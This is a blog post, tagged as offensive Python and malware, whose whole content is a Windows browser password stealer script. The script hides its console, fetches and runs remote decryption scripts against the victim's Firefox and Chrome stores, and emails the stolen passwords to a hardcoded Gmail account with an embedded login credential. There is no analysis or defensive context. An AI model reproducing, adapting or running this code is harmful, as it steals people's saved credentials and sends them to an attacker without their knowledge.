---
layout: single
title: Browser Stealer - Python
excerpt: "Browser Stealer Script."
date: 2025-03-16
classes: wide
header:
  teaser: /img2/images/python.jpg"
  teaser_home_page: true
  icon: /img2/python.ico
categories:
  - Python
  - Scripts
tags:
  - Python Ofensivo
  - Malware
---

```python
# coding: cp850

import subprocess 
import smtplib
import os
import sys
import requests
import tempfile
import ctypes
from email.mime.text import MIMEText
 
 
 
 
def hide_console(): 
  if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0) 
    
    

def run_command(command): 
    try:
        output_command= subprocess.check_output(command,shell=True) 
        return output_command.decode("cp850").strip() if output_command else None 
    except Exception as e:
        print(f"\n[!] Error al ejecutar el comando {command}. Err: {e}")
        return None
def send_email(subject,body,sender,recipients,password): 
    msg=MIMEText(body)
    msg['Subject'] = subject
    msg['From']= sender
    msg['To']= ', '.join(recipients)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(sender,password)
        smtp_server.sendmail(sender,recipients,msg.as_string())   


def get_firefox_profiles(username):
    path= f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles" 
    try:
        profiles= [profile for profile in os.listdir(path) if "release" in profile] 
        return profiles[0] if profiles else None
    except Exception as e:
        print(f"\n[!] No ha sido posible obtener los profiles de Firefox\n")
        return None

def get_firefox_passwords(username,profile): 
    r = requests.get("https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py")  
    temp_dir = tempfile.mkdtemp() 
    os.chdir(temp_dir) 
    
    with open("firefox_decrypt.py", "wb") as f: 
        f.write(r.content) 
    
    p= requests.get("https://raw.githubusercontent.com/Riieiro/GoogleChromeDescrypt/refs/heads/main/google_descrypt.py")
    with open("google_descrypt.py", "wb") as f: 
        f.write(p.content)

    
    command=f"python firefox_decrypt.py C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile}" 
    passwords= run_command(command) 
    command2= "python google_descrypt.py"
    passwordsg=run_command(command2)

    passwords= passwords + passwordsg
    os.remove("firefox_decrypt.py") 
    os.remove("google_descrypt.py")
    return passwords 


if __name__=='__main__':
    hide_console() 
    username_str = run_command("whoami") 
    username = username_str.split("\\")[1]  
    profiles = get_firefox_profiles(username)
    
    
    if not username or not profiles:
        print(f"\n[!] No ha sido posible obtener el nombre de usuario o perfiles válidos para Firefox")
        sys.exit(1)

    passwords = get_firefox_passwords(username,profiles) 
    if passwords: 
        send_email("Data Report", passwords, "nockeylogger@gmail.com", ["nockeylogger@gmail.com"], "ezro xvah ctgy qhlt")
    else: 
        print(f"\n[!] No se han encontrado contraseñas")
```